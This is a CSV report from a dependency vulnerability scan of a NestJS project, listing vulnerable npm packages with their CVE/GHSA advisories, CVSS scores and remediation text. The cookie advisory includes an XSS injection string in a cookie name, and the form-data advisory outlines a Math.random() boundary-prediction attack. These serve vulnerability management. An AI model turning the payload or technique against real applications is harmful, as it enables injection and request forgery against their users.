"Project","ScanDate","DependencyName","DependencyPath","Description","License","Md5","Sha1","Identifiers","CPE","CVE","CWE","Vulnerability","Source","CVSSv2_Severity","CVSSv2_Score","CVSSv2","CVSSv3_BaseSeverity","CVSSv3_BaseScore","CVSSv3","CVSSv4_BaseSeverity","CVSSv4_BaseScore","CVSSv4","CPE Confidence","Evidence Count","VendorProject","Product","Name","DateAdded","ShortDescription","RequiredAction","DueDate","Notes"
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",@babel/helpers:7.24.4,/src/package-lock.json?/@babel/helpers:7.24.4,Collection of helper functions used by Babel transforms.,MIT,"","",pkg:npm/%40babel%2Fhelpers@7.24.4,"",GHSA-968p-4wvh-cqc8,CWE-1333 Inefficient Regular Expression Complexity,"### Impact  When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).  Your generated code is vulnerable if _all_ the following conditions are true: - You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group) - You use the `.replace` method on a regular expression that contains named capturing groups - **Your code uses untrusted strings as the second argument of `.replace`**  If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if: - you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 - you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10  You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).   ### Patches  This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.  Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.  ### Workarounds  If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).  ### References  This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",NPM,"","","",MEDIUM,6.199999809265137,CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",@nestjs/common:10.3.7,/src/package-lock.json?/@nestjs/common:10.3.7,"Nest - modern, fast, powerful node.js web framework (@common)",MIT,"","",pkg:npm/%40nestjs%2Fcommon@10.3.7,"",GHSA-cj7v-w2c7-cp7c,CWE-94 Improper Control of Generation of Code ('Code Injection'),File Upload vulnerability in nestjs nest prior to v.11.0.16 allows a remote attacker to execute arbitrary code via the Content-Type header.,NPM,"","","",MEDIUM,5.5,CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",body-parser:1.20.2,/src/package-lock.json?express:4.19.2/body-parser:1.20.2,Node.js body parsing middleware,MIT,"","",pkg:npm/body-parser@1.20.2,"",GHSA-qwcr-r2fm-qrc7,CWE-405 Asymmetric Resource Consumption (Amplification),"### Impact  body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.  ### Patches  this issue is patched in 1.20.3  ### References",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,5,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",brace-expansion:1.1.11,/src/package-lock.json?brace-expansion,"","","","",pkg:npm/brace-expansion@1.1.11,"",GHSA-v6h2-p8h4-qcjw,CWE-400 Uncontrolled Resource Consumption,"A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",NPM,"","","",LOW,3.0999999046325684,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L,"","","",HIGHEST,3,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",braces:3.0.2,/src/package-lock.json?micromatch:4.0.5/braces:^3.0.2,"Bash-like brace expansion, implemented in JavaScript. Safer than other brace expansion libs, with complete support for the Bash 4.3 braces specification, without sacrificing speed.",MIT,"","",pkg:npm/braces@3.0.2,"cpe:2.3:a:braces_project:braces:3.0.2:*:*:*:*:*:*:*, cpe:2.3:a:jonschlinkert:braces:3.0.2:*:*:*:*:*:*:*",CVE-2024-4068,"CWE-400 Uncontrolled Resource Consumption, CWE-1050 Excessive Platform Resource Consumption within a Loop","The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends ""imbalanced braces"" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.",NVD,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:3.9/RC:R/MAV:A,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",braces:3.0.2,/src/package-lock.json?micromatch:4.0.5/braces:^3.0.2,"Bash-like brace expansion, implemented in JavaScript. Safer than other brace expansion libs, with complete support for the Bash 4.3 braces specification, without sacrificing speed.",MIT,"","",pkg:npm/braces@3.0.2,"cpe:2.3:a:braces_project:braces:3.0.2:*:*:*:*:*:*:*, cpe:2.3:a:jonschlinkert:braces:3.0.2:*:*:*:*:*:*:*",GHSA-grv7-fg5c-xmjg,"CWE-400 Uncontrolled Resource Consumption, CWE-1050 Excessive Platform Resource Consumption within a Loop","The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends ""imbalanced braces"" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,8,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",cookie:0.6.0,/src/package-lock.json?express:4.19.2/cookie:0.6.0,HTTP server cookie parsing and serialization,MIT,"","",pkg:npm/cookie@0.6.0,"",GHSA-pxg6-pf52-xh8x,CWE-74 Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),"### Impact  The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a"", value)` would result in `""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test""`, setting `userName` cookie to `<script>` and ignoring `value`.  A similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.  ### Patches  Upgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.  ### Workarounds  Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.  ### References  * https://github.com/jshttp/cookie/pull/167",NPM,"","","","","","","","","",HIGHEST,6,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",cross-spawn:7.0.3,/src/package-lock.json?foreground-child:3.1.1/cross-spawn:^7.0.0,Cross platform child_process#spawn and child_process#spawnSync,MIT,"","",pkg:npm/cross-spawn@7.0.3,"",GHSA-3xgq-45jj-v275,CWE-1333 Inefficient Regular Expression Complexity,Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.,NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",express:4.19.2,/src/package-lock.json?/express:4.19.2,"Fast, unopinionated, minimalist web framework",MIT,"","",pkg:npm/express@4.19.2,"",GHSA-qw6h-vgh9-j6wx,CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),"### Impact  In express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code  ### Patches  this issue is patched in express 4.20.0  ### Workarounds  users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist  ### Details  successful exploitation of this vector requires the following:  1. The attacker MUST control the input to response.redirect() 1. express MUST NOT redirect before the template appears 1. the browser MUST NOT complete redirection before: 1. the user MUST click on the link in the template",NPM,"","","",MEDIUM,5.0,CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L,"","","",HIGHEST,7,"","","","","","","",""
NestJS-App,"Fri, 3 Oct 2025 21:05:17 GMT",form-data:4.0.0,/src/package-lock.json?superagent:8.1.2/form-data:^4.0.0,"A library to create readable ""multipart/form-data"" streams. Can be used to submit forms and file uploads to other web applications.",MIT,"","",pkg:npm/form-data@4.0.0,"",GHSA-fjxv-7rqg-78g4,CWE-330 Use of Insufficiently Random Values,"### Summary  form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker: 1. can observe other values produced by Math.random in the target application, and 2. can control one field of a request made using form-data  Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.  This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.  ### Details  The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347  An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))  ### PoC  PoC here: https://github.com/benweissmann/CVE-2025-7783-poc  Instructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID).   ### Impact  For an application to be vulnerable, it must: - Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array) - Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values.   If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",NPM,"","","","","","","","","",HIGHEST,6,"","","","","","","",""
